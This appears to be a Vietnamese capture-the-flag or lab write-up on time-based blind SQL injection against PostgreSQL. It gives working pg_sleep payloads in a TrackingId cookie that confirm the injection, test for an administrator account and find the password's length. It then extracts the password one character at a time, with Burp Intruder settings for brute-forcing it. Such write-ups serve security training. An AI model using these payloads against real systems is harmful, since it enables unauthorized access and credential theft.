<h1>Blind SQL injection with time delays and information retrieval</h1>

<h2>1. Kiểm tra bằng payload đơn giản</h2>
<p><b>Payload kiểm tra TRUE</b></p>
<pre>TrackingId=xyz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</pre>
<p>1=1 → luôn đúng → pg_sleep(10) chạy → server ngủ 10 giây → response chậm.<br>Nếu response trễ 10 giây → chứng tỏ payload chạy, SQL bị inject thành công.</p>
<p><b>Payload kiểm tra FALSE</b></p>
<pre>TrackingId=xyz'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</pre>
<p>1=2 luôn sai → chạy pg_sleep(0) → phản hồi lập tức.<br>Nếu response KHÔNG trễ → xác nhận kỹ thuật time‑based hoạt động.</p>

<h2>2. Kiểm tra user administrator</h2>
<p>Payload:</p>
<pre>TrackingId=x'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</pre>
<ul>
  <li>Query duyệt users table.</li>
  <li>Khi đến row administrator → điều kiện đúng → sleep 10s.</li>
  <li>Nếu website chạy chậm 10 giây → user administrator tồn tại.</li>
</ul>

<h2>3. Tìm độ dài password</h2>
<p>Kiểm tra từng giá trị bằng cách tăng LENGTH(password)>N.</p>
<p>Ví dụ:</p>
<pre>TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1)
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</pre>
<ul>
  <li>Nếu password dài hơn 1 ký tự → response chậm → TRUE.</li>
  <li>Bạn tiếp tục thử >2, >3, >4...</li>
  <li>Khi nào response hết chậm → điều kiện sai.</li>
  <li>Ví dụ khi LENGTH(password)>20 trả về nhanh → password dài đúng 20 ký tự.</li>
</ul>


<h2>4. Brute-force từng ký tự của password</h2>
<p>Payload mẫu:</p>
<pre>TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a')
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</pre>
<ul>
  <li>SUBSTRING(password,1,1) lấy ký tự đầu tiên.</li>
  <li>So sánh với 'a'.</li>
  <li>Nếu đúng → server ngủ 10 giây.</li>
</ul>

<h3>Cấu hình Burp Intruder</h3>
<ul>
  <li>Thêm § vào payload.<pre>TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§')
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</pre></li>
  <li>Tạo danh sách payload: Payloads → Simple list → Add from list → a-z, 0-9</li>
  <li>Chạy Intruder ở single thread: Vào Resource Pool → Maximum concurrent 1</li>
  <li>Start Attack</li>
</ul>
